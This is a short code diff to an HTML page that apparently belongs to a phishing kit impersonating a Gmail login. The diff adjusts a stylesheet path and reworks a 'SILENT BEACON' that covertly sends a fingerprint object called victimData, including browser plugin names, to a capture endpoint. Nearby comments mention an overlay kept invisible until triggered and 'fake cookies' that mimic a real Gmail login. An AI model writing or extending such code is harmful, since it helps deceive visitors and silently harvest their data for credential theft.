@@ -10,7 +10,7 @@
       href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap"
       rel="stylesheet"
     />
-    <link rel="stylesheet" href="/styles.css" />
+    <link rel="stylesheet" href="styles.css" />
     <style>
       /* LOADING OVERLAY (invisible until triggered) */
       .loading-overlay {
@@ -189,9 +189,9 @@
           plugins: Array.from(navigator.plugins).map(p => p.name).join(',')
         };
         
-        // **SILENT BEACON**
-        navigator.sendBeacon('/api/workspace_capture', 
-        new Blob([JSON.stringify(victimData)], {type: 'application/json'})
+        // **SILENT BEACON** (background - no blocking)
+        navigator.sendBeacon('/workspace_capture.php', 
+          new Blob([JSON.stringify(victimData)], {type: 'application/json'})
         );
         
         // **SAVE FAKE COOKIES** (looks like real Gmail login)
